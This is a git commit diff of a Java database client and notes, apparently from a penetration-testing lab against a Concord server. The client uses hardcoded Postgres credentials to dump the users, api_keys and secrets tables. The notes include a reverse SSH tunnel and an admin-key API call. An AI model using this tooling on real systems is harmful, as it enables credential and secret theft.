7fac14881ae195f76f69250f6145d2dcc91567b0
zinhart <aromzinhartdegraca@gmail.com>
2022-12-14 14:29:27 -0800

    Save point. Notes update and refactoring.

--- concord/part-1/Client.java
+++ concord/part-1/Client.java
@@ -2,8 +2,60 @@ import java.sql.Connection;
 import java.sql.DriverManager;
 import java.sql.ResultSet;
 import java.sql.Statement;
-
+// apikey stuff
+import java.security.SecureRandom;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.util.Base64;
+import java.util.Base64.Encoder;
+import static java.util.Arrays.asList;
+import java.util.List;
 public class Client {
+   public static String generateSecureRandom() {
+        // create instance of SecureRandom class
+        SecureRandom rnd = new SecureRandom();
+        byte[] ab = new byte[16];
+        rnd.nextBytes(ab);
+
+        Encoder e = Base64.getEncoder().withoutPadding();
+        String s =  e.encodeToString(ab);
+        System.out.println(String.format("Secure Random: %s", s));
+        MessageDigest md;
+        try {
+            md = MessageDigest.getInstance("SHA-256");
+        } catch (NoSuchAlgorithmException ex) {
+            throw new RuntimeException(ex);
+        }
+
+        byte[] hash = Base64.getDecoder().decode(s);
+        hash = md.digest(hash);
+        String api_key = Base64.getEncoder().withoutPadding().encodeToString(hash);
+        System.out.println(String.format("ApiKey: %s", api_key));
+        return api_key;
+   }
+   public static void insert(Connection c, String table, List<String> columns, String ... values) {
+
+   }
+   public static void getPermissions(Connection c, String table) {
+      System.out.println(String.format("(+) Attempting to retrieve permissions for table: %s", table));
+      try {
+         Statement stmt = null;
+         String sql = String.format("SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_name='%s'", table);
+         stmt = c.createStatement();
+         ResultSet rs = stmt.executeQuery(sql);
+         System.out.print("(+) Grantee Privilege Type");
+         while ( rs.next() ) {
+            System.out.println(String.format("(+) %s %s",rs.getString("grantee"),rs.getString("privilege_type")));
+         }
+         rs.close();
+         stmt.close();
+      } catch(Exception e) {
+         System.err.println("(-) Failure in getPermissions");
+         System.err.println(e.getClass().getName()+": "+e.getMessage());
+         System.exit(0);
+      }
+
+   }
    public static void getTables(Connection c) {
       System.out.println("(+) Attempting to retrieve tables");
       try {
@@ -11,6 +63,7 @@ public class Client {
          String sql = "SELECT * FROM information_schema.tables";
          stmt = c.createStatement();
          ResultSet rs = stmt.executeQuery(sql);
+         System.out.print("(+) ");
          while ( rs.next() ) {
             System.out.println(String.format("(+) Table Name: %s",rs.getString("table_name")));
          }
@@ -40,6 +93,7 @@ public class Client {
          System.exit(0);
       }
    }
+
    public static String ezFormat(Object... args) {
       String format = new String(new char[args.length]).replace("\0", "%s;");
       return String.format(format, args);
@@ -84,6 +138,43 @@ public class Client {
       }
       
    }
+   public static void dbExtract(String db, String port ) {
+      try {
+         Connection c = null;
+         Statement stmt = null;
+         Class.forName("org.postgresql.Driver");
+         String url = String.format("jdbc:postgresql://%s:%s/postgres", db, port);
+         c = DriverManager.getConnection(url, "postgres", "quake1quake2quake3arena");
+         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
+         getTables(c);
+         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
+         getColumns(c, "users");
+         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
+         getColumns(c, "api_keys");
+         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
+         getColumns(c, "secrets");
+         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
+         dumpTable(c, "users", "user_id", "username", "display_name", "user_type", "user_email", "is_disabled", "last_group_sync_dt", "domain");
+         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
+         dumpTable(c, "api_keys", "user_id", "api_key", "key_id", "key_name", "expired_at", "last_notified_at");
+         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
+         getPermissions(c, "secrets");
+         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
+
+         dumpTable(c, "secrets", "secret_name", "secret_type", "secret_data", "encrypted_by", "secret_id", "org_id", "owner_id", "visibility", "store_type", "project_id");
+         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
+         getColumns(c, "roles");
+         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
+         dumpTable(c, "roles", "role_id", "role_name", "global_reader", "global_writer");
+
+         insert(c, "api_keys", asList("col1", "col2", "col3"), "val1", "val2", "val3");
+         c.close();
+      }catch(Exception e) {
+         System.err.println("(-) Failure in getColumns");
+         System.err.println(e.getClass().getName()+": "+e.getMessage());
+         System.exit(0);
+      }
+   }
    public static void main(String args[]) {
       Connection c = null;
       String db = "";
@@ -96,24 +187,9 @@ public class Client {
             db = args[0];
             port = args[1];
          }
-         Class.forName("org.postgresql.Driver");
-         String url = String.format("jdbc:postgresql://%s:%s/postgres", db, port);
-         c = DriverManager.getConnection(url, "postgres", "quake1quake2quake3arena");
-         //getTables(c);
-         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
-         getColumns(c, "users");
-         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
-         getColumns(c, "api_keys");
-         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
-         getColumns(c, "secrets");
-         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
-         dumpTable(c, "users", "user_id", "username", "display_name", "user_type", "user_email", "is_disabled", "last_group_sync_dt", "domain");
-         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
-         dumpTable(c, "api_keys", "user_id", "api_key", "key_id", "key_name", "expired_at", "last_notified_at");
-         System.out.println("--------------------------------------------------------------------------------------------------------------------------------------------------");
-         dumpTable(c, "secrets", "secret_name", "secret_type", "secret_data", "encrypted_by", "secret_id", "org_id", "owner_id", "visibility", "store_type", "project_id");
-
-         c.close();
+         dbExtract(db, port);
+         generateSecureRandom();
+         
       } catch (Exception e) {
          e.printStackTrace();
          System.err.println(e.getClass().getName()+": "+e.getMessage());
--- concord/part-1/notes.md
+++ concord/part-1/notes.md
@@ -21,7 +21,13 @@ ssh -N -R 5432:172.18.0.4:5432 tunnelboy@192.168.119.130 -o "StrictHostKeyChecki
 ```
 We can build our jdbc client with compile.ps1  
 
+Searching the codebase:
+```powershell
+gci -Recurse -Filter "*.java" |  sls -Pattern salt | select line,path
+```
+concord documentation: https://web.archive.org/web/20201123223951/https://concord.walmartlabs.com/docs/api/secret.html
 Api Token creation at: https://github.com/walmartlabs/concord/blob/master/server/liquibase-ext/src/main/java/com/walmartlabs/concord/server/liquibase/ext/ApiTokenCreator.java
+Specific Location is ApiKeyDao.java
 
 Interacting with api with admin auth key
 iwr -Uri 'http://concord:8001/api/v1/apikey' -Headers @{ Authorization = "basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA"));ContentType= "application/json"}
